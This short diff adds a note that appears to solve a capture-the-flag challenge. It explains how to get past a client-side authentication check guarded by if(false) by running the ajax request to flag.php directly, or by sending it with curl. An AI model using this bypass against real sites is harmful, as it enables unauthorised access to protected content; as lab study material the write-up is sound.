@@ -1,0 +1,11 @@
+Copy this part of the authentication javascript bypass if(false) and does the trick
+	$.ajax({
+		url: 'flag.php',
+		success: function(data) {
+			$('.output').html(data);
+		}
+	});
+
+
+
+Another way to solve this is by crafting a ajax query and sending it to flag.php with curl
